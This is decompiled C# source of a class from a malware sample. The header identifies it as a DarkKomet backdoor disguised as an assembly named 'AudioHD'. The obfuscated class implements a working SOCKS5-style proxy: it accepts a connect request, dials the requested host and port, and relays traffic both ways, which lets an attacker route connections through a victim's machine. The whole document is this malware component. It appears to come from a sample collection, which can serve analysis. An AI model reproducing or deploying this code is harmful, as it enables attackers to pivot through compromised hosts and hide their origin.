// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public sealed class \u0002\u2000
{
  private TcpClient \u0002;
  private TcpClient \u0003;
  private byte \u0005 = 5;
  private byte \u0008;
  private byte \u0006;
  private byte \u000E = 1;
  private byte \u000F = 3;

  public \u0002\u2000(TcpClient _param1) => this.\u0002 = _param1;

  public void \u0002()
  {
    NetworkStream stream1 = this.\u0002.GetStream();
    byte[] buffer1 = new byte[2];
    stream1.Read(buffer1, 0, 2);
    byte[] buffer2 = new byte[(int) buffer1[1]];
    stream1.Read(buffer2, 0, buffer2.Length);
    byte[] buffer3 = new byte[2]{ this.\u0005, this.\u0008 };
    stream1.Write(buffer3, 0, 2);
    byte[] buffer4 = new byte[4];
    stream1.Read(buffer4, 0, 4);
    string empty = string.Empty;
    if ((int) buffer4[3] == (int) this.\u000E)
    {
      byte[] numArray = new byte[4];
      stream1.Read(numArray, 0, 4);
      empty = new IPAddress(numArray).ToString();
    }
    else if ((int) buffer4[3] == (int) this.\u000F)
    {
      byte[] buffer5 = new byte[1];
      stream1.Read(buffer5, 0, 1);
      byte[] numArray = new byte[(int) buffer5[0]];
      stream1.Read(numArray, 0, (int) buffer5[0]);
      empty = Encoding.Default.GetString(numArray);
    }
    if (!(empty != string.Empty))
      return;
    byte[] buffer6 = new byte[2];
    stream1.Read(buffer6, 0, 2);
    int uint16 = (int) BitConverter.ToUInt16(new byte[2]
    {
      buffer6[1],
      buffer6[0]
    }, 0);
    Console.WriteLine(\u0006\u2002.\u0002(-885874790) + empty + \u0006\u2002.\u0002(-885875456) + uint16.ToString());
    this.\u0003 = new TcpClient(empty, uint16);
    if (!this.\u0003.Connected)
      return;
    byte[] buffer7 = new byte[10];
    buffer7[0] = this.\u0005;
    buffer7[1] = this.\u0006;
    buffer7[2] = (byte) 0;
    buffer7[3] = (byte) 1;
    IPAddress ipAddress = IPAddress.Parse(this.\u0003.Client.LocalEndPoint.ToString().Split(':')[0]);
    buffer7[4] = ipAddress.GetAddressBytes()[0];
    buffer7[5] = ipAddress.GetAddressBytes()[1];
    buffer7[6] = ipAddress.GetAddressBytes()[2];
    buffer7[7] = ipAddress.GetAddressBytes()[3];
    int num = int.Parse(this.\u0003.Client.LocalEndPoint.ToString().Split(':')[1]);
    buffer7[8] = BitConverter.GetBytes((ushort) num)[0];
    buffer7[9] = BitConverter.GetBytes((ushort) num)[1];
    stream1.Write(buffer7, 0, 10);
    NetworkStream stream2 = this.\u0003.GetStream();
    bool flag = false;
    while (this.\u0003.Connected && this.\u0002.Connected && !flag)
    {
      Thread.Sleep(100);
      try
      {
        if (stream1.DataAvailable)
        {
          byte[] numArray1 = new byte[10000];
          int length = stream1.Read(numArray1, 0, 10000);
          byte[] numArray2 = new byte[length];
          Array.Copy((Array) numArray1, (Array) numArray2, length);
          stream2.Write(numArray2, 0, numArray2.Length);
        }
        if (stream2.DataAvailable)
        {
          byte[] numArray3 = new byte[10000];
          int length = stream2.Read(numArray3, 0, 10000);
          byte[] numArray4 = new byte[length];
          Array.Copy((Array) numArray3, (Array) numArray4, length);
          stream1.Write(numArray4, 0, numArray4.Length);
        }
      }
      catch
      {
        flag = true;
      }
    }
    if (this.\u0002.Connected)
      this.\u0002.Close();
    if (!this.\u0003.Connected)
      return;
    this.\u0003.Close();
  }
}
